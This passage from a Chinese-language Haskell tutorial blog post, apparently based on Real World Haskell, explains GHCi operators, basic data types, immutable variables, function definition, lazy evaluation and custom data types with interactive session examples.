effects</strong>. Its flagship compiler, GHC, comes with <strong>a high-performance parallel garbage collector</strong> and light-weight concurrency library containing a number of useful concurrency primitives and abstractions.</p></li></ul><h1>运算符</h1><p>主要来自 <a href="https://rwh.readthedocs.io/en/latest/index.html">Real World Haskell 中文版</a>，也是写的不错的书。</p><p><strong>ghci</strong> 程序是 GHC 的交互式解析器。它可以让用户输入 Haskell 表达式并对其求值，浏览模块以及调试代码。如果你熟悉 Python 或是 Ruby，那么 ghci 一定程度上和 <code>python</code>，<code>irb</code> 很像，这两者分别是 Python 和 Ruby 的交互式解析器。</p><ol><li><code>+</code> <code>-</code> <code>*</code> <code>/</code> 都是常见的二元运算符，基本和其他语言一致。<code>-</code> 作为负号时，这个一元运算符需要添加括号。注意 <code>/</code> jie’gu</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; 2+-3</span><br><span class="line"></span><br><span class="line">&lt;interactive&gt;:2:2: error:</span><br><span class="line">    • Variable not in scope: (+-) :: t0 -&gt; t1 -&gt; t</span><br><span class="line">    • Perhaps you meant one of these:</span><br><span class="line">        ‘+’ (imported from Prelude), ‘-’ (imported from Prelude),</span><br><span class="line">        ‘++’ (imported from Prelude)</span><br><span class="line">Prelude&gt; 2+(-3)</span><br><span class="line">-1</span><br></pre></td></tr></table></figure><p>总而言之，符号 在 Haskell 中非常重要。</p><ol start="2"><li><p>Haskell 中表示布尔逻辑的值有这么两个：<code>True</code>和<code>False</code>。名字中的大写很重要。作用于布尔值得操作符类似于 C 语言的情况：<code>(&amp;&amp;)</code>表示“逻辑与”，<code>(||)</code>表示“逻辑或”。<strong>需要注意，0 /= False</strong>，这是强类型的语言，非 0 值也不是 True</p></li><li><p><code>!=</code> 在这里的写法不同，而是<code>/=</code></p></li><li><p><code>++</code> 表示为列表连接。<code>Prelude&gt; [1,2,3]++[4,5,6]</code> 结果是 <code> [1,2,3,4,5,6]</code></p></li><li><p><code>:</code> 是二元操作符，用于增加一个元素到列表的头部，第一个操数是元素，第二个操作数是列表，<code>Prelude&gt; 0:[1,2,3]++[4,5,6] </code> 结果是 <code> [0,1,2,3,4,5,6]</code></p></li></ol><p>更多的，建议读者多<a href="https://hackage.haskell.org/package/base-4.17.0.0/docs/Prelude.html">阅读文档</a>，官方的文档永远是最好的参考手册。</p><h1>数据类型</h1><p><strong>在 Haskell 里，所有类型名字都以大写字母开头，而所有变量名字都以小写字母开头。它不会自动地将值从一个类型转换到另一个类型（转换有时又称为强制或变换）</strong></p><ol><li><p>列表：<code>[1,2,3]</code>，和 python 类似，但是列表的元素类型需要一致。</p><p>列表可以使用枚举符号，也就是说 <code>[1,2..6]</code> 会自动补全为<code>[1,2,3,4,5,6]</code>。<code>[1,4..15]</code> 补全为<code>[1,4,7,10,13]</code></p><p>新建列表也可以写成集合的形式，例如</p></li><li><p>字符和字符串和 C 语言类似。 <code>'a'</code> 是字符， <code>&quot;a&quot;</code> 是字符串。<strong>字符串也是列表，可以当作字符的列表，是等价的。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ghci&gt; let a = [&#x27;l&#x27;, &#x27;o&#x27;, &#x27;t&#x27;, &#x27;s&#x27;, &#x27; &#x27;, &#x27;o&#x27;, &#x27;f&#x27;, &#x27; &#x27;, &#x27;w&#x27;, &#x27;o&#x27;, &#x27;r&#x27;, &#x27;k&#x27;]</span><br><span class="line">ghci&gt; a</span><br><span class="line">&quot;lots of work&quot;</span><br><span class="line">ghci&gt; a == &quot;lots of work&quot;</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>所以可以得到类似的结论</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; &quot;123&quot;++&quot;abc&quot;</span><br><span class="line">&quot;123abc&quot;</span><br><span class="line">Prelude&gt; &#x27;x&#x27;:&quot;123&quot;++&quot;abc&quot;</span><br><span class="line">&quot;x123abc&quot;</span><br></pre></td></tr></table></figure></li><li><p>元组的长度是固定的，但可以包含不同类型的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; (1964, &quot;Labyrinths&quot;)</span><br><span class="line">(1964,&quot;Labyrinths&quot;)</span><br></pre></td></tr></table></figure><p>元组是有顺序的，比较的时候是对应元素比较</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; :type (False, &#x27;a&#x27;)</span><br><span class="line">(False, &#x27;a&#x27;) :: (Bool, Char)</span><br><span class="line">Prelude&gt; :type (&#x27;a&#x27;,False)</span><br><span class="line">(&#x27;a&#x27;,False) :: (Char, Bool)</span><br><span class="line">Prelude&gt; (False, &#x27;a&#x27;) == (False, &#x27;a&#x27;)</span><br><span class="line">True</span><br><span class="line">Prelude&gt; (False, &#x27;a&#x27;) == (&#x27;a&#x27;,False)</span><br><span class="line"></span><br><span class="line">&lt;interactive&gt;:10:18: error:</span><br><span class="line">• Couldn&#x27;t match expected type ‘Bool’ with actual type ‘Char’</span><br><span class="line">• In the expression: &#x27;a&#x27;</span><br><span class="line">In the second argument of ‘(==)’, namely ‘(&#x27;a&#x27;, False)’</span><br><span class="line">In the expression: (False, &#x27;a&#x27;) == (&#x27;a&#x27;, False)</span><br><span class="line"></span><br><span class="line">&lt;interactive&gt;:10:22: error:</span><br><span class="line">• Couldn&#x27;t match expected type ‘Char’ with actual type ‘Bool’</span><br><span class="line">• In the expression: False</span><br><span class="line">In the second argument of ‘(==)’, namely ‘(&#x27;a&#x27;, False)’</span><br><span class="line">In the expression: (False, &#x27;a&#x27;) == (&#x27;a&#x27;, False)</span><br></pre></td></tr></table></figure></li><li><p>分数表示比较特殊，<code>1/2</code> 表示为 <code>1%2</code>，它实际上是比较精确的比例，<code>:m +Data.Ratio</code> 表示引入 Data.Ratio module。相应的，也可以撤销引入的模块 <code>:m -Data.Ratio</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; :m +Data.Ratio</span><br><span class="line">Prelude Data.Ratio&gt; 11%29</span><br><span class="line">11 % 29</span><br><span class="line">it :: Integral a =&gt; Ratio a</span><br></pre></td></tr></table></figure></li><li><p><code>Char</code>：单个 Unicode 字符。</p></li><li><p><code>Bool</code>表示一个布尔逻辑值。这个类型只有两个值： <code>True</code> 和 <code>False</code> 。</p></li><li><p><code>Int</code> 带符号的定长（fixed-width）整数。这个值的准确范围由机器决定：在 32 位机器里， <code>Int</code> 为 32 位宽，在 64 位机器里， <code>Int</code> 为 64 位宽。Haskell 保证 <code>Int</code> 的宽度不少于 28 位。（数值类型还可以是 8 位、16 位，等等，也可以是带符号和无符号的，以后会介绍。）</p></li><li><p><code>Integer</code> 不限长度的带符号整数。 <code>Integer</code> 并不像 <code>Int</code> 那么常用，因为它们需要更多的内存和更大的计算量。另一方面，对 <code>Integer</code> 的计算不会造成溢出，因此使用 <code>Integer</code> 的计算结果更可靠。</p></li><li><p><code>Double</code> 用于表示浮点数。长度由机器决定，通常是 64 位。（Haskell 也有 <code>Float</code> 类型，但是并不推荐使用，因为编译器都是针对 <code>Double</code> 来进行优化的，而 <code>Float</code> 类型值的计算要慢得多。）</p></li></ol><p>还有一类是容器类型，最常见的容器类型是列表（List），它可以包含任何类型的元素，例如<code>[Int]</code>表示整数列表，<code>[Char]</code>表示字符列表（也就是 String）。Haskell 中的其他常见容器类型包括：</p><ul><li><code>Maybe</code>：一个可能包含元素也可能为空的容器。<code>Maybe Int</code>可以包含一个<code>Int</code>或者什么都不包含。</li><li><code>Either</code>：一个可以包含两种类型之一的元素的容器。<code>Either String Int</code>可以包含一个<code>String</code>或一个<code>Int</code>。</li><li><code>Set</code>：一个包含不重复元素的容器。</li><li><code>Map</code>：一个键值对的容器，你可以根据键找到对应的值。</li><li><code>Tree</code>：一个树形结构的容器，每个节点都可以包含一个值。</li></ul><hr><p>ghci 也可以设置命令行的参数，可以执行 <code>:set +t</code> 让打印变量时也打印类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; :set +t</span><br><span class="line">Prelude&gt; &#x27;c&#x27;</span><br><span class="line">&#x27;c&#x27;</span><br><span class="line">it :: Char</span><br><span class="line"></span><br><span class="line">Prelude&gt; [1,2,3]</span><br><span class="line">[1,2,3]</span><br><span class="line">it :: Num a =&gt; [a]</span><br><span class="line"></span><br><span class="line">Prelude&gt; &quot;abc&quot;</span><br><span class="line">&quot;abc&quot;</span><br><span class="line">it :: [Char]</span><br><span class="line"></span><br><span class="line">Prelude&gt; 1</span><br><span class="line">1</span><br><span class="line">it :: Num p =&gt; p</span><br><span class="line"></span><br><span class="line">Prelude&gt; 0.5</span><br><span class="line">0.5</span><br><span class="line">it :: Fractional p =&gt; p</span><br><span class="line"></span><br><span class="line">Prelude&gt; :m +Data.Ratio</span><br><span class="line">Prelude Data.Ratio&gt; 11%29</span><br><span class="line">11 % 29</span><br><span class="line">it :: Integral a =&gt; Ratio a</span><br></pre></td></tr></table></figure><ul><li><code>x :: y</code> 表示表达式 <code>x</code> 的类型为 <code>y</code></li><li>[Char] 表示由 char 类型的元素构成的数组。</li><li><code>=&gt;</code> 左边表示·变量的类型约束，比如 <code>Num</code> 是类型类，它约束了 <code>p</code> 必须是 <code>Num</code> 类型的变量。右边是表示函数类型。我们看一个复杂的例子</li></ul><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">squareSum</span> :: <span class="type">Num</span> a =&gt; a -&gt; a -&gt; a</span><br><span class="line"><span class="title">squareSum</span> x y = (x + y) * (x + y)</span><br></pre></td></tr></table></figure><p>这里 <code>=&gt;</code> 规定 <code>a</code> 是 <code>Num</code> 类型的变量，函数类型是 <code> a -&gt; a -&gt; a</code>。其中函数类型是由 <code>-&gt;</code> 构成的，它表示可以接受一个参数，然后返回一个函数。当接受到 2 个参数后，它就会返回 <code>a</code>。<code>-&gt;</code> 的作用就是将参数和函数返回类型链接在一起。</p><p>另外的命令行参数 <code>:type</code> 可以直接地看到变量的类型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Prelude Data.Ratio&gt; :type 1</span><br><span class="line">1 :: Num p =&gt; p</span><br></pre></td></tr></table></figure><p><strong>显式指定类型</strong></p><p><code>::</code> 可以显式指定类型，叫做类型签名。<code>'a' :: Char</code></p><h1>变量</h1><p>如果你曾经用过命令式语言（如 C、C++、Java 等），就会发现 Haskell 的变量和命令式语言的变量很不同：在命令式语言里，一个变量通常用于标识一个内存位置（或者其他类似的东西），并且在任何时候，都可以随意修改这个变量的值。因此在不同时间点上，访问这个变量得出的值可能是完全不同的。</p><p>在 Haskell 里，可以使用变量来赋予表达式名字：一旦变量绑定了（也即是，关联起）某个表达式，那么这个变量的值就不会改变。文件 assign.hs 内容是</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">x</span>=<span class="number">1</span></span><br><span class="line"><span class="title">x</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(base) ➜  vim assign.hs</span><br><span class="line">(base) ➜  ghci</span><br><span class="line">Prelude&gt; :load assign.hs</span><br><span class="line">[1 of 1] Compiling Main             ( assign.hs, interpreted )</span><br><span class="line"></span><br><span class="line">assign.hs:2:1: error:</span><br><span class="line">    Multiple declarations of ‘x’</span><br><span class="line">    Declared at: assign.hs:1:1</span><br><span class="line">                 assign.hs:2:1</span><br><span class="line">  |</span><br><span class="line">2 | x=2</span><br><span class="line">  | ^</span><br><span class="line">Failed, no modules loaded.</span><br></pre></td></tr></table></figure><h1>函数调用</h1><p>基本格式是函数名和参数，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; odd 3</span><br><span class="line">True</span><br><span class="line"></span><br><span class="line">Prelude&gt; odd 6</span><br><span class="line">False</span><br><span class="line"></span><br><span class="line">Prelude&gt; compare 2 3</span><br><span class="line">LT</span><br><span class="line"></span><br><span class="line">Prelude&gt; compare 3 3</span><br><span class="line">EQ</span><br><span class="line"></span><br><span class="line">Prelude&gt; compare 3 2</span><br><span class="line">GT</span><br></pre></td></tr></table></figure><p><strong>函数的优先级比操作符要高</strong></p><p>函数也具有类型，表示输入到输出的映射</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; add a b = a+b</span><br><span class="line">Prelude&gt; add 2 3</span><br><span class="line">5</span><br><span class="line">Prelude&gt; :type add</span><br><span class="line">add :: Num a =&gt; a -&gt; a -&gt; a</span><br></pre></td></tr></table></figure><p>这里很多的箭头表示，一个数 a 映射到 <code>a -&gt; (a -&gt; a)</code> 函数，也就是返回了 <code>a -&gt; (a -&gt; a)</code> 函数，接着根据 <code>a</code> 的值返回 <code>a -&gt; a</code> 函数，直到最后返回一个数。</p><h1>函数定义</h1><p><code>add a b = a + b</code> 中， <code>add</code> 是函数名，后面是参数，<code>=</code> 之后是函数体。可以加载定义好的函数，也就是加载模块。</p><p>add.hs 里是上述代码，然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(base) ➜  vim add.hs</span><br><span class="line">(base) ➜  ghci</span><br><span class="line">Prelude&gt; :load add.hs</span><br><span class="line">[1 of 1] Compiling Main             ( add.hs, interpreted )</span><br><span class="line">Ok, one module loaded.</span><br><span class="line">*Main&gt; add 4.1 5</span><br><span class="line">9.1</span><br></pre></td></tr></table></figure><p>在 Haskell 里，<strong>代码的缩进非常重要</strong>：它会延续（continue）一个已存在的定义，而不是新创建一个。所以，不要省略缩进！</p><p>Haskell 也是使用缩进来表示一个表达式或者块延伸的范围的，这点与 Python 类似。Haskell 的缩进规则简单总结起来只用下面三条：</p><ol><li>源文件中第一个顶级的定义或者声明的缩进，定义了该文件中所有顶级定义或者声明的缩进；</li><li>空白行（只有注释的行也认为是空白行）和比前面某一行更加向右的缩进都表示对前面那一行所在块或者表达式的继续；</li><li>由 let 和 where 开始的一个块，在 let 或者 where 关键字后第一个定义或者声明的缩进，定义了该块中所有定义或者声明应该具有的缩进。</li></ol><p>定义函数如下：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">myDrop</span> n xs = <span class="keyword">if</span> n&lt;= <span class="number">0</span> || null xs</span><br><span class="line">    <span class="keyword">then</span> xs</span><br><span class="line">    <span class="keyword">else</span> myDrop (n-<span class="number">1</span>) (tail xs)</span><br><span class="line"><span class="comment">-- null 判断是否是空值，这里是列表是否为空</span></span><br><span class="line"><span class="comment">-- 这里是递归的形式，实际上还是很清楚的</span></span><br></pre></td></tr></table></figure><p>上述代码也支持写成一行：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">myDropX</span> n xs = <span class="keyword">if</span> n &lt;= <span class="number">0</span> || null xs <span class="keyword">then</span> xs <span class="keyword">else</span> myDropX (n - <span class="number">1</span>) (tail xs)</span><br></pre></td></tr></table></figure><h2 id="操作列表的函数">操作列表的函数</h2><p><code>head</code> 函数取出列表的第一个元素：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; head [1, 2, 3, 4]</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">Prelude&gt; head [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span><br><span class="line">&#x27;a&#x27;</span><br></pre></td></tr></table></figure><p><code>tail</code> 取出列表里<em>除了第一个元素之外的其他元素</em>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; tail [1, 2, 3, 4]</span><br><span class="line">[2,3,4]</span><br><span class="line"></span><br><span class="line">Prelude&gt; tail [2, 3, 4]</span><br><span class="line">[3,4]</span><br><span class="line"></span><br><span class="line">Prelude&gt; tail [True, False]</span><br><span class="line">[False]</span><br></pre></td></tr></table></figure><p><code>take</code> 返回一个包含 <code>l</code> 前 <code>n</code> 个元素的列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; take 2 [1, 2, 3, 4, 5]</span><br><span class="line">[1,2]</span><br></pre></td></tr></table></figure><p><code>drop</code> 则返回一个包含 <code>l</code> 丢弃了前 <code>n</code> 个元素之后，剩余元素的列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; drop 2 [1, 2, 3, 4, 5]</span><br><span class="line">[3,4,5]</span><br></pre></td></tr></table></figure><h2 id="操作元组的函数">操作元组的函数</h2><p>函数 <code>fst</code> 和 <code>snd</code> 接受一个<strong>元组</strong>作为参数，返回该元组的第一个元素和第二个元素：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; fst (1, &#x27;a&#x27;)</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">Prelude&gt; snd (1, &#x27;a&#x27;)</span><br><span class="line">&#x27;a&#x27;</span><br></pre></td></tr></table></figure><h1>惰性求值</h1><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- file: ch02/isOdd.hs</span></span><br><span class="line"><span class="title">isOdd</span> n = mod n <span class="number">2</span> == <span class="number">1</span></span><br></pre></td></tr></table></figure><p>这是 Haskell 很重要的特性。先说一般的编程语言（命令式编程语言），他们采用严格求值的方法，也就是：函数的参数总是在应用函数之前被求值。以 <code>isOdd</code> 为例子：子表达式 <code>(1 + 2)</code> 会首先被求值，得出结果 <code>3</code> 。接着，将 <code>3</code> 绑定到变量 <code>n</code> ，应用到函数 <code>isOdd</code> 。最后， <code>mod 3 2</code> 返回 <code>1</code> ，而 <code>1 == 1</code> 返回 <code>True</code> 。</p><p>但是 Haskell 采用非严格求值，求值 <code>isOdd (1 + 2)</code> 并不会即刻使得子表达式 <code>1 + 2</code> 被求值为 <code>3</code> ，相反，编译器做出了一个“承诺”，说，“当真正有需要的时候，我有办法计算出 <code>isOdd (1 + 2)</code> 的值”。</p><h1>面向表达式编程</h1><p>记住，Haskell 是一门以<strong>表达式为主导（expression-oriented）的语言，所有分支都是表达式，所有逻辑都是表达式嵌套表达式</strong>。在命令式语言中，代码由陈述（statement）而不是表达式组成，因此在省略 <code>if</code> 语句的 <code>else</code> 分支的情况下，程序仍是有意义的。但是，当代码由表达式组成时，一个缺少 <code>else</code> 分支的 <code>if</code> 语句，在条件部分为 <code>False</code> 时，是没有办法给出一个结果的，当然这个 <code>else</code> 分支也不会有任何类型，因此，省略 <code>else</code> 分支对于 Haskell 是无意义的，编译器也不会允许这么做。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">myDropX</span> n xs = <span class="keyword">if</span> n &lt;= <span class="number">0</span> || null xs <span class="keyword">then</span> xs <span class="keyword">else</span> myDropX (n - <span class="number">1</span>) (tail xs)</span><br></pre></td></tr></table></figure><p>当执行表达式 <code>myDrop 2 &quot;abcd&quot;</code> 时，函数 <code>myDrop</code> 应用于值 <code>2</code> 和 <code>&quot;abcd&quot;</code> ，变量 <code>n</code> 被绑定为 <code>2</code> ，而变量 <code>xs</code> 被绑定为 <code>&quot;abcd&quot;</code> 。将这两个变量代换到 <code>myDrop</code> 的条件判断部分，就得出了以下表达式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Main&gt; :type 2 &lt;= 0 || null &quot;abcd&quot;</span><br><span class="line">2 &lt;= 0 || null &quot;abcd&quot; :: Bool</span><br></pre></td></tr></table></figure><p>编译器需要对表达式 <code>2 &lt;= 0 || null &quot;abcd&quot;</code> 进行求值，从而决定 <code>if</code> 该执行哪一个分支。这需要对 <code>(||)</code> 表达式进行求值，而要求值这个表达式，又需要对它的左操作符进行求值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Main&gt; 2 &lt;= 0</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>将值 <code>False</code> 代换到 <code>(||)</code> 表达式当中，得出以下表达式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Main&gt; :type False || null &quot;abcd&quot;</span><br><span class="line">False || null &quot;abcd&quot; :: Bool</span><br></pre></td></tr></table></figure><p>如果 <code>(||)</code> 左操作符的值为 <code>True</code> ，那么 <code>(||)</code> 就不需要对右操作符进行求值，因为整个 <code>(||)</code> 表达式的值已经由左操作符决定了。[译注：在逻辑或计算中，只要有一个变量的值为真，那么结果就为真。]另一方面，因为这里左操作符的值为 <code>False</code> ，那么 <code>(||)</code> 表达式的值由右操作符的值来决定：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Main&gt; null &quot;abcd&quot;</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>最后，将左右两个操作对象的值分别替换回 <code>(||)</code> 表达式，得出以下表达式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Main&gt; False || False</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>这个结果表明，下一步要求值的应该是 <code>if</code> 表达式的 <code>else</code> 分支，而这个分支包含一个对 <code>myDrop</code> 函数自身的递归调用： <code>myDrop (2 - 1) (tail &quot;abcd&quot;)</code> 。</p><h1>自定义类型</h1><h2 id="基本语法结构">基本语法结构</h2><p>以一个在线书店为例子，展示如何去进行类型定义。</p><p>使用 <code>data</code> 关键字可以定义新的数据类型：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- file: BookStore.hs</span></span><br><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">BookInfo</span> = <span class="type">Book</span> <span class="type">Int</span> <span class="type">String</span> [<span class="type">String</span>] <span class="keyword">deriving</span>(<span class="type">Show</span>)</span></span><br><span class="line"><span class="title">myInfo</span> = <span class="type">Book</span> <span class="number">9780135072455</span> <span class="string">&quot;Algebra of Programming&quot;</span></span><br><span class="line">              [<span class="string">&quot;Richard Bird&quot;</span>, <span class="string">&quot;Oege de Moor&quot;</span>]</span><br></pre></td></tr></table></figure><p>跟在 <code>data</code> 关键字之后的 <code>BookInfo</code> 就是新类型的名字，我们称 <code>BookInfo</code> 为<strong>类型构造器</strong>。类型构造器用于指代（refer）类型。正如前面提到过的，类型名字的首字母必须大写，因此，类型构造器的首字母也必须大写。</p><p>接下来的 <code>Book</code> 是<strong>值构造器</strong>（有时候也称为数据构造器）的名字，也就是声明变量时用的名字。类型的值就是由值构造器创建的。值构造器名字的首字母也必须大写。</p><p><strong>在 Haskell 里，类型的名字（类型构造器）和值构造器的名字是相互独立的。类型构造器只能出现在类型的定义，或者类型签名当中。而值构造器只能出现在实际的代码中。值构造器既可以是一般意义上的值，也可以是函数。</strong></p><p>在 <code>Book</code> 之后的 <code>Int</code> ， <code>String</code> 和 <code>[String]</code> 是类型的<em>组成部分</em>。组成部分的作用，和面向对象语言的类中的域作用一致：它是一个储存值的槽。（为了方便起见，我们通常也将组成部分称为域。）</p><p>在这个例子中， <code>Int</code> 表示一本书的 ID ，而 <code>String</code> 表示书名，而 <code>[String]</code> 则代表作者。<code>deriving (Show)</code> 表示继承了 Show 的属性，可以被打印出来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; :load BookStore.hs</span><br><span class="line">[1 of 1] Compiling Main             ( BookStore.hs, interpreted )</span><br><span class="line">Ok, one module loaded.</span><br><span class="line">*Main&gt; myInfo</span><br><span class="line">Book 9780135072455 &quot;Algebra of Programming&quot; [&quot;Richard Bird&quot;,&quot;Oege de Moor&quot;]</span><br><span class="line"></span><br><span class="line">*Main&gt; a = Book 0 &quot;The Book of Imaginary Beings&quot; [&quot;Jorge Luis Borges&quot;]</span><br><span class="line">*Main&gt; a</span><br><span class="line">Book 0 &quot;The Book of Imaginary Beings&quot; [&quot;Jorge Luis Borges&quot;]</span><br></pre></td></tr></table></figure><p>可以获取相关信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*Main&gt; :info BookInfo</span><br><span class="line">type BookInfo :: *</span><br><span class="line">data BookInfo = Book Int String [String]</span><br><span class="line">        -- Defined at BookStore.hs:1:1</span><br><span class="line">instance [safe] Show BookInfo -- Defined at BookStore.hs:1:51</span><br><span class="line"></span><br><span class="line">*Main&gt; :t Book</span><br><span class="line">Book :: Int -&gt; String -&gt; [String] -&gt; BookInfo</span><br></pre></td></tr></table></figure><p>在函数中的用法也比较类似，需要声明值选择器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Main&gt; data Coord = Coord Int Int deriving (Show)</span><br><span class="line"></span><br><span class="line">*Main&gt; x = Coord 3 4</span><br><span class="line"></span><br><span class="line">*Main&gt; x</span><br><span class="line">Coord 3 4</span><br><span class="line"></span><br><span class="line">*Main&gt; add (Coord x y) = x+y</span><br><span class="line">*Main&gt; add x</span><br><span 